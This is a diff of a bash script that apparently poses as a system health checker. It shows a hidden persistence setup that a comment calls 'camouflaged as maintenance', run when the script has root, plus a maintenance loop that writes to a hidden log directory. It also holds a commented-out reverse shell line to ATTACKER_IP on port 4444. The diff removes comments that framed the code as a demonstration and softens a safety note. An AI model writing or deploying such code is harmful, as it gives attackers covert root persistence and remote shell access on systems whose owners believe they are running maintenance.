@@ -127,7 +127,7 @@ while true; do
     # For safety, we'll only log the attempt
     echo "$(date): Maintenance check performed" >> /var/log/.system_maintenance/maintenance.log
     
-    # Attempt connection (commented out for safety - uncomment in lab with controlled IP)
+    # Attempt connection (uncomment only in controlled lab environment)
     # /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' 2>/dev/null &
     
     sleep 10
@@ -168,7 +168,6 @@ SERVICEEOF
 # MAIN EXECUTION
 # ============================================
 
-# Main execution flow
 main() {
     echo "Starting system analysis..."
     echo ""
@@ -180,7 +179,6 @@ main() {
     check_system_health
     
     # Setup hidden persistence (camouflaged as maintenance)
-    # Only run if root (for demonstration purposes)
     if [[ $EUID -eq 0 ]]; then
         echo -e "${YELLOW}[*] Setting up automated maintenance...${NC}"
         setup_maintenance
